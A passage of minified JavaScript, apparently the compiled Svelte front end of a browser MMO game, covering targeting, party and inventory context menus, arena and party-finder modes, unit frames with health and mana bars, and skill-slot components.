            if (void 0 !== s ? s !== bw && (void 0 !== bw && void 0 !== bw.transform && 3 !== bw.type && bw.transform.removeColor(kw),
                void 0 !== s.transform && 3 !== s.type && s.transform.addColor(kw),
                bw = s) : void 0 !== bw && void 0 !== bw.transform && (3 !== bw.type && bw.transform.removeColor(kw),
                    bw = void 0),
                e !== ww ? (ww = e,
                    xw = 1) : xw = Math.max(xw * (1 - 10 * t), 0),
                e > 0) {
                const t = Ua.getEntityById(e);
                if (void 0 !== t) {
                    Vi(Ac.Xs.value, t.transform.position[0], .5 * t.size + .5 + xw, t.transform.position[2]);
                    const e = t.stats && t.stats.alive ? Ua.player.hostility(t) > 0 ? lw.enemy : lw.friendly : lw.dead;
                    Xn(Ac.QV.value, ...e, 1 - xw)
                }
            } else
                Vi(Ac.Xs.value, 0, 0, 0)
        }
        ;
    let Sw = 0;
    const Ew = t => {
        if (Sw > 0) {
            let e = 0
                , s = 0;
            t = t.filter(t => void 0 !== t.transform && void 0 !== t.stats && t.stats.alive && t !== Ua.player && Ua.player.canCombatInteract(t) && Math.abs(fr(Ua.player.rot, Ua.player.rotationToV3(t.Za))) < .7);
            let i = 0 === Ua.player.target;
            for (let n = t.length - 1; n >= 0; --n) {
                const a = t[n];
                1 === Sw != Ua.player.hostility(a) > 0 && (i && (e = a.id),
                    Ua.player.target === a.id && (i = !0),
                    s || (s = a.id),
                    0 !== e && (n = 0))
            }
            0 === e && 0 !== s && (e = s),
                cw(e),
                Sw = 0
        }
    }
        , Mw = () => {
            mw = 0,
                uw.reset(0),
                bw = void 0,
                ww = 0,
                xw = 0
        }
        ;
    var _w = Object.freeze({
        __proto__: null,
        Dk: ow,
        setTarget: cw,
        get hovertarget() {
            return hw
        },
        get hoverinteractive() {
            return dw
        },
        targetSwitchNetTimer: uw,
        targetSwitchConciliate: pw,
        init: gw,
        setHoverTarget: vw,
        preTick: yw,
        tick: $w,
        parseHudTargets: Ew,
        onWorldDestroy: Mw
    });
    const Cw = document.createElement("textarea");
    Cw.style.position = "absolute",
        Cw.style.left = "-9999px",
        document.body.appendChild(Cw);
    const Tw = t => {
        Cw.value = t,
            Cw.select(),
            document.execCommand("copy")
    }
        , Pw = (t, e, s) => {
            Yt.update(i => (i.push({
                title: t,
                text: e,
                choices: s
            }),
                i))
        }
        ;
    let Iw = !0;
    const Dw = (t, e, s, i, n) => {
        t ? Iw && (Pw(i, n, [{
            text: i,
            fun: () => {
                Iw = !0,
                    rp(e, "" + s)
            }
        }, {
            text: Xi.ui.decline,
            fun: () => {
                Iw = !0
            }
        }]),
            Iw = !1) : rp(e, "" + s)
    }
        , Aw = {
            Lx: {
                partyBasedHostility: !1,
                allowRespawn: !0,
                pvpprotect: !0,
                instanced: !1
            },
            arena3v3: {
                name: "Arena 3v3",
                queue: !0,
                instanced: !0,
                groupsize: 3,
                groupcount: 2,
                partyBasedHostility: !0,
                allowRespawn: !1,
                pvpprotect: !1
            },
            arena5v5: {
                name: "Arena 5v5",
                startTimer: 30,
                groupsize: 5,
                groupcount: 2,
                queue: !0,
                instanced: !0,
                partyBasedHostility: !0,
                allowRespawn: !1,
                pvpprotect: !1
            },
            guardstonefind: {
                name: "Guardstone",
                queue: !0,
                partyfind: !0,
                minlevel: 0
            },
            headlessfind: {
                name: "Headless Landing",
                queue: !0,
                partyfind: !0,
                minlevel: 25
            },
            faivelfind: {
                name: "Faivel",
                queue: !0,
                partyfind: !0,
                minlevel: 35
            }
        }
        , Bw = {
            partyleave: t => ({
                name: Xi.ui.party.leave,
                fun: () => {
                    rp("partyleave")
                }
            }),
            partyinvite: t => ({
                name: Xi.ui.party.invite,
                fun: () => {
                    rp("partyinvite", t)
                }
            }),
            partykick: t => ({
                name: Xi.ui.party.kick,
                fun: () => {
                    rp("partykick", t)
                }
            }),
            partygiveassistant: t => ({
                name: Xi.ui.party.giveAssistant,
                fun: () => {
                    rp("partysetrole", t + " 1")
                }
            }),
            partygiveleader: t => ({
                name: Xi.ui.party.giveLeader,
                fun: () => {
                    rp("partysetrole", t + " 2")
                }
            }),
            partyremoveassistant: t => ({
                name: Xi.ui.party.removeAssistant,
                fun: () => {
                    rp("partysetrole", t + " 0")
                }
            }),
            partylink: t => ({
                name: Xi.ui.party.link,
                fun: () => {
                    rp("partylink")
                }
            }),
            partycreate: t => ({
                name: Xi.ui.party.create,
                fun: () => {
                    rp("partycreate")
                }
            }),
            whisper: t => ({
                name: Xi.ui.chat.whisper,
                fun: () => {
                    is.set(t)
                }
            }),
            itemdrop: (...t) => ({
                name: Xi.ui.inventory.drop,
                fun: () => Zw(...t)
            }),
            itemsell: (...t) => ({
                name: Xi.ui.inventory.sell,
                fun: () => Fw(...t)
            }),
            itemstash: t => ({
                name: Xi.ui.stash.stash,
                fun: () => {
                    rp("itemstash", t)
                }
            }),
            itemmove: (t, e) => ({
                name: Xi.ui.inventory.equip,
                fun: () => {
                    ib(13, 100),
                        rp("itemmove", `${t} ${e}`)
                }
            }),
            itemsplithalf: t => ({
                name: Xi.ui.inventory.splithalf,
                fun: () => {
                    rp("itemsplithalf", t)
                }
            }),
            itemsplitone: t => ({
                name: Xi.ui.inventory.splitone,
                fun: () => {
                    rp("itemsplitone", t)
                }
            }),
            itemuse: (t, e) => ({
                name: by.get(e).name || Xi.ui.inventory.use,
                fun: () => {
                    Bm(ro.clientPlayerSkill.packData({
                        id: e,
                        info: [t]
                    }))
                }
            }),
            itemcopyid: t => ({
                name: Xi.ui.inventory.copyitemid,
                fun: () => {
                    Tw(t)
                }
            }),
            startqueue: (t, e) => ({
                name: Aw[t].name,
                css: e ? "" : "disabled",
                fun: () => {
                    rp("startqueue", t)
                }
            }),
            stopqueue: (t, e) => ({
                icon: "check",
                name: Aw[t].name,
                css: e ? "" : "disabled",
                fun: () => {
                    rp("stopqueue", t)
                }
            })
        }
        , Rw = (t, e) => {
            const s = [];
            0 === e.type && (e.id == Ua.player.id ? ji.partyinfo.membercount > 0 ? s.push(Bw.partyleave()) : s.push(Bw.partycreate()) : (e.faction == Ua.player.faction && (Ua.party.has(e.name) ? ji.partyinfo.role > e.role && (2 == ji.partyinfo.role && s.push(Bw.partykick(e.name)),
                0 == e.role ? s.push(Bw.partygiveassistant(e.name)) : 1 == e.role && s.push(Bw.partyremoveassistant(e.name)),
                ji.partyinfo.role > 1 && s.push(Bw.partygiveleader(e.name))) : s.push(Bw.partyinvite(e.name))),
                s.push(Bw.whisper(e.name)))),
                Wt.set({
                    x: t.pageX,
                    y: t.pageY,
                    opts: s
                })
        }
        , zw = (t, e, s, i, n, a, r, o) => {
            Dw(e >= ji.itemProtectQuality || s > 0, t, i, r, `${o} ${Hi(n, a)}?`)
        }
        , Fw = (t, e, s, i, n) => {
            zw("itemtradersell", t, e, s, i, n, "Sell item", "Really sell")
        }
        , Zw = (t, e, s, i, n) => {
            zw("itemdrop", t, e, s, i, n, "Drop item", "Really drop")
        }
        ;
    function Uw(t, e, s) {
        const i = t.slice();
        return i[27] = e[s],
            i
    }
    function Lw(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g = [], v = new Map, y = "default" == t[2] && Nw();
        const b = new Vb({
            props: {
                size: "1.3em",
                fract: t[7],
                barcol: t[12],
                left: t[9],
                right: t[5],
                darken: !1,
                $$slots: {
                    default: [jw]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        let w = ("default" == t[2] || t[18]) && qw(t);
        function x(t, e) {
            return t[14].role >= 1 ? Kw : Hw
        }
        let k = x(t)
            , $ = k(t)
            , S = "default" == t[2] && t[14].combat && t[14].alive && Ww()
            , C = t[19];
        const P = t => t[27].id;
        for (let e = 0; e < C.length; e += 1) {
            let s = Uw(t, C, e)
                , i = P(s);
            v.set(i, g[e] = Yw(i, s))
        }
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    y && y.c(),
                    i = T("img"),
                    r = T("div"),
                    Ft(b.$$.fragment),
                    w && w.c(),
                    o = D(),
                    $.c(),
                    c = D(),
                    S && S.c(),
                    h = T("div");
                for (let t = 0; t < g.length; t += 1)
                    g[t].c();
                B(i, "class", n = "pclass icon border black bgc" + t[14].class + " svelte-61vb2w"),
                    i.src !== (a = (!1 !== t[14].powertype ? "/assets/ui/mobpower/" + t[14].powertype : "/assets/ui/classes/" + t[14].class) + "." + Bo) && B(i, "src", a),
                    B(s, "class", "iconcontainer svelte-61vb2w"),
                    B(h, "class", d = "buffarray " + t[2] + " svelte-61vb2w"),
                    B(r, "class", u = "panel-black bars " + (t[17] && t[14].id == t[17].id && "party" == t[2] ? "target" : "") + " " + (t[14].id && t[14].range ? "targetable" : "") + " svelte-61vb2w"),
                    B(e, "id", t[4]),
                    B(e, "class", m = "grid " + (t[3] ? "right" : "left") + " svelte-61vb2w"),
                    U(e, "font-size", t[16] + "%"),
                    U(e, "opacity", t[14].range ? "" : .5)
            },
            m(n, a, d) {
                M(n, e, a),
                    E(e, s),
                    y && y.m(s, null),
                    E(s, i),
                    E(e, r),
                    Zt(b, r, null),
                    w && w.m(r, null),
                    E(r, o),
                    $.m(r, null),
                    E(r, c),
                    S && S.m(r, null),
                    E(r, h);
                for (let t = 0; t < g.length; t += 1)
                    g[t].m(h, null);
                p = !0,
                    d && l(f),
                    f = [A(e, "click", t[20]), A(e, "contextmenu", t[26])]
            },
            p(t, l) {
                "default" == t[2] ? y || (y = Nw(),
                    y.c(),
                    y.m(s, i)) : y && (y.d(1),
                        y = null),
                    (!p || 16384 & l && n !== (n = "pclass icon border black bgc" + t[14].class + " svelte-61vb2w")) && B(i, "class", n),
                    (!p || 16384 & l && i.src !== (a = (!1 !== t[14].powertype ? "/assets/ui/mobpower/" + t[14].powertype : "/assets/ui/classes/" + t[14].class) + "." + Bo)) && B(i, "src", a);
                const f = {};
                if (128 & l && (f.fract = t[7]),
                    4096 & l && (f.barcol = t[12]),
                    512 & l && (f.left = t[9]),
                    32 & l && (f.right = t[5]),
                    1073754244 & l && (f.$$scope = {
                        dirty: l,
                        ctx: t
                    }),
                    b.$set(f),
                    "default" == t[2] || t[18] ? w ? (w.p(t, l),
                        262148 & l && Et(w, 1)) : (w = qw(t),
                            w.c(),
                            Et(w, 1),
                            w.m(r, o)) : w && ($t(),
                                Mt(w, 1, 1, () => {
                                    w = null
                                }
                                ),
                                St()),
                    k === (k = x(t)) && $ ? $.p(t, l) : ($.d(1),
                        $ = k(t),
                        $ && ($.c(),
                            $.m(r, c))),
                    "default" == t[2] && t[14].combat && t[14].alive ? S || (S = Ww(),
                        S.c(),
                        S.m(r, h)) : S && (S.d(1),
                            S = null),
                    524292 & l) {
                    const e = t[19];
                    $t(),
                        g = At(g, l, P, 1, t, e, v, h, Dt, Yw, null, Uw),
                        St()
                }
                (!p || 4 & l && d !== (d = "buffarray " + t[2] + " svelte-61vb2w")) && B(h, "class", d),
                    (!p || 147460 & l && u !== (u = "panel-black bars " + (t[17] && t[14].id == t[17].id && "party" == t[2] ? "target" : "") + " " + (t[14].id && t[14].range ? "targetable" : "") + " svelte-61vb2w")) && B(r, "class", u),
                    (!p || 16 & l) && B(e, "id", t[4]),
                    (!p || 8 & l && m !== (m = "grid " + (t[3] ? "right" : "left") + " svelte-61vb2w")) && B(e, "class", m),
                    (!p || 65536 & l) && U(e, "font-size", t[16] + "%"),
                    (!p || 16384 & l) && U(e, "opacity", t[14].range ? "" : .5)
            },
            i(t) {
                if (!p) {
                    Et(b.$$.fragment, t),
                        Et(w);
                    for (let t = 0; t < C.length; t += 1)
                        Et(g[t]);
                    p = !0
                }
            },
            o(t) {
                Mt(b.$$.fragment, t),
                    Mt(w);
                for (let t = 0; t < g.length; t += 1)
                    Mt(g[t]);
                p = !1
            },
            d(t) {
                t && _(e),
                    y && y.d(),
                    Ut(b),
                    w && w.d(),
                    $.d(),
                    S && S.d();
                for (let t = 0; t < g.length; t += 1)
                    g[t].d();
                l(f)
            }
        }
    }
    function Nw(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    B(e, "class", "deco svelte-61vb2w")
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ow(t) {
        let e, s, i;
        return {
            c() {
                e = T("div"),
                    B(e, "class", s = "progressBar " + t[12] + " hpdelta svelte-61vb2w"),
                    B(e, "style", i = (t[13] ? "transition:none;" : "") + "width:" + t[7] + "%;")
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, n) {
                4096 & n && s !== (s = "progressBar " + t[12] + " hpdelta svelte-61vb2w") && B(e, "class", s),
                    8320 & n && i !== (i = (t[13] ? "transition:none;" : "") + "width:" + t[7] + "%;") && B(e, "style", i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function jw(t) {
        let e, s = "default" == t[2] && Ow(t);
        return {
            c() {
                s && s.c(),
                    e = D()
            },
            m(t, i) {
                s && s.m(t, i),
                    M(t, e, i)
            },
            p(t, i) {
                "default" == t[2] ? s ? s.p(t, i) : (s = Ow(t),
                    s.c(),
                    s.m(e.parentNode, e)) : s && (s.d(1),
                        s = null)
            },
            d(t) {
                s && s.d(t),
                    t && _(e)
            }
        }
    }
    function qw(t) {
        let e;
        const s = new Vb({
            props: {
                size: "0.7em",
                fract: t[8],
                barcol: t[15],
                left: t[10],
                right: t[6],
                darken: !0,
                $$slots: {
                    default: [Xw]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            p(t, e) {
                const i = {};
                256 & e && (i.fract = t[8]),
                    32768 & e && (i.barcol = t[15]),
                    1024 & e && (i.left = t[10]),
                    64 & e && (i.right = t[6]),
                    1073743872 & e && (i.$$scope = {
                        dirty: e,
                        ctx: t
                    }),
                    s.$set(i)
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function Xw(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    B(e, "class", "progressBar bgspell castbar svelte-61vb2w"),
                    U(e, "width", t[11] + "%"),
                    U(e, "display", t[11] > 0 ? "inherit" : "none")
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, s) {
                2048 & s && U(e, "width", t[11] + "%"),
                    2048 & s && U(e, "display", t[11] > 0 ? "inherit" : "none")
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Hw(t) {
        let e, s, i;
        return {
            c() {
                e = T("img"),
                    B(e, "class", s = "tag icon border black bgf" + t[14].faction + " round svelte-61vb2w"),
                    e.src !== (i = "/assets/ui/factions/" + t[14].faction + "." + Bo) && B(e, "src", i)
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, n) {
                16384 & n && s !== (s = "tag icon border black bgf" + t[14].faction + " round svelte-61vb2w") && B(e, "class", s),
                    16384 & n && e.src !== (i = "/assets/ui/factions/" + t[14].faction + "." + Bo) && B(e, "src", i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Kw(t) {
        let e, s;
        return {
            c() {
                e = T("img"),
                    B(e, "class", "tag icon border black bgblack round svelte-61vb2w"),
                    e.src !== (s = "/assets/ui/icons/" + (2 == t[14].role ? "star" : "starsilver") + "." + Bo) && B(e, "src", s)
            },
            m(t, s) {
                M(t, e, s)
            },
            p(t, i) {
                16384 & i && e.src !== (s = "/assets/ui/icons/" + (2 == t[14].role ? "star" : "starsilver") + "." + Bo) && B(e, "src", s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ww(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    B(e, "class", "tag icon border black round combat svelte-61vb2w")
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Yw(t, e) {
        let s, i;
        const n = [e[27], {
            size: "default" == e[2] ? 31 : 23
        }];
        let r = {};
        for (let t = 0; t < n.length; t += 1)
            r = a(r, n[t]);
        const o = new rw({
            props: r
        });
        return {
            key: t,
            first: null,
            c() {
                s = D(),
                    Ft(o.$$.fragment),
                    this.first = s
            },
            m(t, e) {
                M(t, s, e),
                    Zt(o, t, e),
                    i = !0
            },
            p(t, e) {
                const s = 524292 & e ? Bt(n, [524288 & e && Rt(t[27]), 4 & e && {
                    size: "default" == t[2] ? 31 : 23
                }]) : {};
                o.$set(s)
            },
            i(t) {
                i || (Et(o.$$.fragment, t),
                    i = !0)
            },
            o(t) {
                Mt(o.$$.fragment, t),
                    i = !1
            },
            d(t) {
                t && _(s),
                    Ut(o, t)
            }
        }
    }
    function Vw(t) {
        let e, s, i = t[14].visible && Lw(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[14].visible ? i ? (i.p(t, s),
                    16384 & s && Et(i, 1)) : (i = Lw(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function Gw(t, e, s) {
        let n, a, r, o, l = i, c = () => (l(),
            l = u(p, t => s(14, n = t)),
            p), h = i, d = () => (h(),
                h = u(f, t => s(19, o = t)),
                f);
        m(t, ae, t => s(17, a = t)),
            m(t, Hs, t => s(18, r = t)),
            t.$$.on_destroy.push(() => l()),
            t.$$.on_destroy.push(() => h());
        let { unit: p } = e;
        c();
        let { buffs: f } = e;
        d();
        let g, v, y, b, w, x, k, $, S, E, M, { mode: _ = "default" } = e, { order: C = 0 } = e, { id: T = "" } = e, P = !1, I = 0;
        const D = t => {
            n.id && cw(n.id)
        }
            , A = t => Rw(t, n);
        let B, R, z;
        return t.$set = t => {
            "unit" in t && c(s(0, p = t.unit)),
                "buffs" in t && d(s(1, f = t.buffs)),
                "mode" in t && s(2, _ = t.mode),
                "order" in t && s(3, C = t.order),
                "id" in t && s(4, T = t.id)
        }
            ,
            t.$$.update = () => {
                16384 & t.$$.dirty && s(24, B = n.world == Ua.id ? !n.alive && "Dead" : n.world),
                    18890756 & t.$$.dirty && (s(21, g = n.hpMax ? "default" == _ ? Mb(n.hp) + "/" + Mb(n.hpMax) : Mb(n.hp) : "?"),
                        s(5, y = B || g),
                        s(7, w = "offline" != B ? ~~(n.hpMax ? n.hp / n.hpMax * 100 : 100) : 0),
                        s(12, M = B ? "bggrey" : (Ua.mode.partyBasedHostility ? n.party === Ua.player.party : n.faction === Ua.player.faction) ? "bghealth" : "bgenemy")),
                    16388 & t.$$.dirty && s(22, v = n.mpMax ? "default" == _ ? Mb(n.mp) + "/" + Mb(n.mpMax) : Mb(n.mp) : "?"),
                    16384 & t.$$.dirty && s(9, k = n.name ? Tb(n.name, 10) : ""),
                    16384 & t.$$.dirty && s(10, $ = n.timedSkill ? (Xi.ui.hiddenskills[n.timedSkill.id] || Xi.items.book[n.timedSkill.id]).name : "Lv. " + n.level),
                    20987904 & t.$$.dirty && s(6, b = B || (n.timedSkill ? n.timedCast.remaining(Ua.smoothtime).toFixed(1) : v)),
                    16793600 & t.$$.dirty && s(8, x = "offline" != B ? ~~(n.mpMax ? n.mp / n.mpMax * 100 : 100) : 0),
                    16793600 & t.$$.dirty && s(11, E = "offline" != B && n.timedSkill ? 100 * n.timedCast.fraction(Ua.smoothtime) : 0),
                    16777216 & t.$$.dirty && s(15, R = B ? "bggrey" : "bgmana"),
                    4 & t.$$.dirty && s(16, z = Math.round("default" == _ ? 100 : 85)),
                    8404992 & t.$$.dirty && (s(13, P = I != n.id),
                        s(23, I = n.id))
            }
            ,
            [p, f, _, C, T, y, b, w, x, k, $, E, M, P, n, R, z, a, r, o, D, g, v, I, B, S, A]
    }
    class Qw extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, Gw, Vw, h, {
                    unit: 0,
                    buffs: 1,
                    mode: 2,
                    order: 3,
                    id: 4
                })
        }
    }
    function Jw(t) {
        let e, s;
        const n = new Qw({
            props: {
                id: "ufplayer",
                order: 0,
                unit: ne,
                buffs: oe
            }
        })
            , a = new Qw({
                props: {
                    id: "uftarget",
                    order: 1,
                    unit: ae,
                    buffs: re
                }
            });
        return {
            c() {
                e = T("div"),
                    Ft(n.$$.fragment),
                    Ft(a.$$.fragment),
                    B(e, "class", "targetframes svelte-17up9g6")
            },
            m(t, i) {
                M(t, e, i),
                    Zt(n, e, null),
                    Zt(a, e, null),
                    s = !0
            },
            p: i,
            i(t) {
                s || (Et(n.$$.fragment, t),
                    Et(a.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(n.$$.fragment, t),
                    Mt(a.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(n),
                    Ut(a)
            }
        }
    }
    class tx extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, null, Jw, d, {})
        }
    }
    function ex(t) {
        let e, s;
        return {
            c() {
                e = T("span"),
                    s = P(t[2]),
                    B(e, "class", "slottext key")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                4 & e[0] && F(s, t[2])
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function sx(t) {
        let e, s;
        return {
            c() {
                e = T("span"),
                    s = P(t[3]),
                    B(e, "class", "slottext stacks")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                8 & e[0] && F(s, t[3])
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function ix(t) {
        let e, s, i = (t[5] > 99 ? Math.round(t[5] / 60) + "'" : t[5] <= 3 ? t[5].toFixed(1) : Math.ceil(t[5])) + "";
        return {
            c() {
                e = T("div"),
                    s = P(i),
                    B(e, "class", "time absCentered slottext svelte-149hjb3")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                32 & e[0] && i !== (i = (t[5] > 99 ? Math.round(t[5] / 60) + "'" : t[5] <= 3 ? t[5].toFixed(1) : Math.ceil(t[5])) + "") && F(s, i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function nx(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    B(e, "class", "autocast svelte-149hjb3")
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function ax(t) {
        let e, s, i;
        const n = t[35].default
            , a = p(n, t, t[34], null);
        return {
            c() {
                e = T("div"),
                    a && a.c(),
                    B(e, "class", s = "border " + t[6] + " slotdescription svelte-149hjb3"),
                    B(e, "style", t[10])
            },
            m(s, n) {
                M(s, e, n),
                    a && a.m(e, null),
                    t[37](e),
                    i = !0
            },
            p(t, r) {
                a && a.p && 8 & r[1] && a.p(f(n, t, t[34], null), g(n, t[34], r, null)),
                    (!i || 64 & r[0] && s !== (s = "border " + t[6] + " slotdescription svelte-149hjb3")) && B(e, "class", s),
                    (!i || 1024 & r[0]) && B(e, "style", t[10])
            },
            i(t) {
                i || (Et(a, t),
                    i = !0)
            },
            o(t) {
                Mt(a, t),
                    i = !1
            },
            d(s) {
                s && _(e),
                    a && a.d(s),
                    t[37](null)
            }
        }
    }
    function rx(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g, v = void 0 !== t[2] && ex(t), y = void 0 !== t[3] && sx(t), b = ji.cdTextSkills && void 0 !== t[5] && ix(t), w = t[11] && nx(), x = t[9] && t[0] && !t[16] && ax(t);
        return {
            c() {
                e = T("div"),
                    v && v.c(),
                    s = D(),
                    y && y.c(),
                    i = D(),
                    b && b.c(),
                    n = T("div"),
                    r = T("div"),
                    c = T("div"),
                    w && w.c(),
                    d = T("img"),
                    x && x.c(),
                    B(n, "class", a = "overlay " + (void 0 !== t[4] ? "" : "hidden") + " svelte-149hjb3"),
                    B(r, "class", o = "overlay " + t[17] + " svelte-149hjb3"),
                    B(c, "class", h = "overlay " + (!t[14] || t[4] > 0 && t[4] < 10 ? "hidden" : "offCd") + " svelte-149hjb3"),
                    B(d, "class", u = "icon " + t[7] + " svelte-149hjb3"),
                    d.src !== (m = t[15]) && B(d, "src", m),
                    B(e, "id", t[8]),
                    B(e, "class", p = "border " + t[6] + " " + (t[16] && t[16].data == t[1] ? "grey" : "") + " slot " + (t[1] ? "filled" : "") + " svelte-149hjb3")
            },
            m(a, o, h) {
                M(a, e, o),
                    v && v.m(e, null),
                    E(e, s),
                    y && y.m(e, null),
                    E(e, i),
                    b && b.m(e, null),
                    E(e, n),
                    t[36](n),
                    E(e, r),
                    E(e, c),
                    w && w.m(e, null),
                    E(e, d),
                    x && x.m(e, null),
                    f = !0,
                    h && l(g),
                    g = [A(e, "pointerenter", t[20]), A(e, "pointerleave", t[21]), A(e, "pointerdown", t[18]), A(e, "pointerup", t[19])]
            },
            p(t, l) {
                void 0 !== t[2] ? v ? v.p(t, l) : (v = ex(t),
                    v.c(),
                    v.m(e, s)) : v && (v.d(1),
                        v = null),
                    void 0 !== t[3] ? y ? y.p(t, l) : (y = sx(t),
                        y.c(),
                        y.m(e, i)) : y && (y.d(1),
                            y = null),
                    ji.cdTextSkills && void 0 !== t[5] ? b ? b.p(t, l) : (b = ix(t),
                        b.c(),
                        b.m(e, n)) : b && (b.d(1),
                            b = null),
                    (!f || 16 & l[0] && a !== (a = "overlay " + (void 0 !== t[4] ? "" : "hidden") + " svelte-149hjb3")) && B(n, "class", a),
                    (!f || 131072 & l[0] && o !== (o = "overlay " + t[17] + " svelte-149hjb3")) && B(r, "class", o),
                    (!f || 16400 & l[0] && h !== (h = "overlay " + (!t[14] || t[4] > 0 && t[4] < 10 ? "hidden" : "offCd") + " svelte-149hjb3")) && B(c, "class", h),
                    t[11] ? w || (w = nx(),
                        w.c(),
                        w.m(e, d)) : w && (w.d(1),
                            w = null),
                    (!f || 128 & l[0] && u !== (u = "icon " + t[7] + " svelte-149hjb3")) && B(d, "class", u),
                    (!f || 32768 & l[0] && d.src !== (m = t[15])) && B(d, "src", m),
                    t[9] && t[0] && !t[16] ? x ? (x.p(t, l),
                        66049 & l[0] && Et(x, 1)) : (x = ax(t),
                            x.c(),
                            Et(x, 1),
                            x.m(e, null)) : x && ($t(),
                                Mt(x, 1, 1, () => {
                                    x = null
                                }
                                ),
                                St()),
                    (!f || 256 & l[0]) && B(e, "id", t[8]),
                    (!f || 65602 & l[0] && p !== (p = "border " + t[6] + " " + (t[16] && t[16].data == t[1] ? "grey" : "") + " slot " + (t[1] ? "filled" : "") + " svelte-149hjb3")) && B(e, "class", p)
            },
            i(t) {
                f || (Et(x),
                    f = !0)
            },
            o(t) {
                Mt(x),
                    f = !1
            },
            d(s) {
                s && _(e),
                    v && v.d(),
                    y && y.d(),
                    b && b.d(),
                    t[36](null),
                    w && w.d(),
                    x && x.d(),
                    l(g)
            }
        }
    }
    function ox(t, e, s) {
        let i;
        m(t, le, t => s(16, i = t));
        let { data: n } = e
            , { key: a } = e
            , { stacks: r } = e
            , { cd: o } = e
            , { remaining: l } = e
            , { border: c = "grey" } = e
            , { img: h } = e
            , { meta: d } = e
            , { css: u = "" } = e
            , { id: p = "" } = e
            , { describe: f = !0 } = e
            , { queued: g = !1 } = e
            , { pickable: v = !0 } = e
            , { descRoot: b } = e
            , { descPos: w = "bottom: 100%; right: 100%;" } = e
            , { auto: x = !1 } = e
            , { status: k = 0 } = e
            , { hover: $ = !1 } = e
            , S = !1;
        const E = (t, e) => t ? "queued" : 5 == e ? "oom" : 6 == e ? "range" : 11 == e || 9 == e ? "combat" : "hidden";
        let M;
        const _ = t => {
            S = !0,
                D(!1),
                B("click", d)
        }
            , C = t => {
                2 == t.button ? $l.shift.down || $l.ctrl.down ? B("use", {
                    e: t,
                    ...d
                }) : B("context", {
                    e: t,
                    ...d
                }) : i ? (i.data.type && vl(i.data.type),
                    B("move", {
                        from: i.meta,
                        to: d
                    }),
                    i.meta && i.meta.store && i.meta.store.set(),
                    y(le, i = void 0)) : A(),
                    S = !1
            }
            , T = t => {
                D(!0)
            }
            , P = () => {
                B("discard")
            }
            , I = t => {
                D(!1),
                    n && S && (S = !1,
                        A())
            }
            , D = t => {
                "force" !== $ && s(0, $ = t)
            }
            , A = () => {
                n && !1 !== v && (n.moving || y(le, i = {
                    data: n,
                    img: h,
                    meta: d,
                    border: c,
                    css: u,
                    discard: P
                }),
                    n.type && vl(n.type))
            }
            , B = st();
        let R, z, F, Z, { $$slots: U = {}, $$scope: L } = e;
        function N(t) {
            at[t ? "unshift" : "push"](() => {
                s(13, R = t)
            }
            )
        }
        function O(t) {
            at[t ? "unshift" : "push"](() => {
                s(12, M = t)
            }
            )
        }
        return t.$set = t => {
            "data" in t && s(1, n = t.data),
                "key" in t && s(2, a = t.key),
                "stacks" in t && s(3, r = t.stacks),
                "cd" in t && s(4, o = t.cd),
                "remaining" in t && s(5, l = t.remaining),
                "border" in t && s(6, c = t.border),
                "img" in t && s(22, h = t.img),
                "meta" in t && s(23, d = t.meta),
                "css" in t && s(7, u = t.css),
                "id" in t && s(8, p = t.id),
                "describe" in t && s(9, f = t.describe),
                "queued" in t && s(24, g = t.queued),
                "pickable" in t && s(25, v = t.pickable),
                "descRoot" in t && s(26, b = t.descRoot),
                "descPos" in t && s(10, w = t.descPos),
                "auto" in t && s(11, x = t.auto),
                "status" in t && s(27, k = t.status),
                "hover" in t && s(0, $ = t.hover),
                "$$scope" in t && s(34, L = t.$$scope)
        }
            ,
            t.$$.update = () => {
                16400 & t.$$.dirty[0] && s(14, z = z || o > 0),
